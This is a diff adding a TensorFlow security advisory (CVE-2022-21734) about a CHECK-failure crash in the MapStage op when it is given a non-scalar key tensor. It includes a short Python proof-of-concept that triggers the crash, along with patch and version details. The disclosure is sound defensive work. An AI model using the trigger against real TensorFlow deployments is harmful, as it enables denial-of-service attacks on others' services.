@@ -1,0 +1,23 @@
+<h2>TFSA-2022-013: <code>CHECK</code>-failures in <code>MapStage</code></h2>
+<h3>CVE Number</h3>
+<p>CVE-2022-21734</p>
+<h3>Impact</h3>
+<p>The <a href="https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/map_stage_op.cc#L519-L550">implementation of <code>MapStage</code></a> is vulnerable a <code>CHECK</code>-fail if the key tensor is not a scalar:</p>
+<p>```python
+import tensorflow as tf
+import numpy as np</p>
+<p>tf.raw_ops.MapStage(
+    key = tf.constant(value=[4], shape= (1,2), dtype=tf.int64),
+    indices = np.array([[6]]),
+    values = np.array([-60]),
+    dtypes = [tf.int64], capacity=0, memory_limit=0,
+    container='', shared_name='', name=None
+)
+```</p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/f57315566d7094f322b784947093406c2aea0d7d">f57315566d7094f322b784947093406c2aea0d7d</a>.</p>
+<p>The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by Faysal Hossain Shezan from University of Virginia.</p>
